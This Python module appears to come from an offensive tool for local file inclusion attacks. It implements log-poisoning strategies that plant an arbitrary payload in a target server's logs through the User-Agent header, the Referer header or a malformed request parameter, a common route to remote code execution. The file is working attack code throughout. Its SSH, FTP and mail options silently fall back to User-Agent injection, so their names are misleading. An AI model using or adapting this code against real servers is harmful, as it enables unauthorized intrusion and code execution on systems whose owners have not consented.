"""
Log poisoning strategies using Strategy Pattern.
Follows Open/Closed Principle and Strategy Pattern.
"""

import urllib.parse
from abc import ABC, abstractmethod

from http_client import HttpClient


class PoisoningStrategy(ABC):
    """Abstract base class for log poisoning strategies."""
    
    def __init__(self, http_client: HttpClient, default_ua: str):
        """
        Initialize poisoning strategy.
        
        Args:
            http_client: HTTP client for making requests
            default_ua: Default User-Agent string
        """
        self.http_client = http_client
        self.default_ua = default_ua
    
    @abstractmethod
    def poison(self, target_url: str, param: str, log_path: str, payload: str) -> bool:
        """
        Execute the poisoning strategy.
        
        Args:
            target_url: Base target URL
            param: LFI parameter name
            log_path: Path to the log file
            payload: Payload to inject
            
        Returns:
            True if successful, False otherwise
        """
        pass


class UserAgentPoisoning(PoisoningStrategy):
    """Poison logs via User-Agent header."""
    
    def poison(self, target_url: str, param: str, log_path: str, payload: str) -> bool:
        """Inject payload via User-Agent header."""
        poison_url = f"{target_url}?{param}={log_path}"
        headers = {'User-Agent': payload}
        
        try:
            response = self.http_client.get(poison_url, headers=headers)
            return response.status_code == 200
        except Exception:
            return False


class MalformedRequestPoisoning(PoisoningStrategy):
    """Poison error logs via malformed request."""
    
    def poison(self, target_url: str, param: str, log_path: str, payload: str) -> bool:
        """Inject payload via malformed request parameter."""
        malformed_url = f"{target_url}?{param}={urllib.parse.quote(payload)}"
        
        try:
            self.http_client.get(malformed_url)
            return True
        except Exception:
            return False


class RefererPoisoning(PoisoningStrategy):
    """Poison logs via Referer header."""
    
    def poison(self, target_url: str, param: str, log_path: str, payload: str) -> bool:
        """Inject payload via Referer header."""
        poison_url = f"{target_url}?{param}={log_path}"
        headers = {
            'Referer': payload,
            'User-Agent': self.default_ua
        }
        
        try:
            response = self.http_client.get(poison_url, headers=headers)
            return response.status_code == 200
        except Exception:
            return False


class PoisoningStrategyFactory:
    """Factory for creating poisoning strategies."""
    
    @staticmethod
    def create(method: str, http_client: HttpClient, default_ua: str) -> PoisoningStrategy:
        """
        Create a poisoning strategy based on method name.
        
        Args:
            method: Poisoning method name
            http_client: HTTP client instance
            default_ua: Default User-Agent string
            
        Returns:
            Appropriate poisoning strategy
            
        Raises:
            ValueError: If method is unknown
        """
        strategies = {
            'user_agent': UserAgentPoisoning,
            'malformed_request': MalformedRequestPoisoning,
            'referer': RefererPoisoning,
            'ssh_username': UserAgentPoisoning,  # Fallback to UA
            'ftp_username': UserAgentPoisoning,  # Fallback to UA
            'mail_field': UserAgentPoisoning     # Fallback to UA
        }
        
        strategy_class = strategies.get(method)
        if not strategy_class:
            raise ValueError(f"Unknown poisoning method: {method}")
        
        return strategy_class(http_client, default_ua)
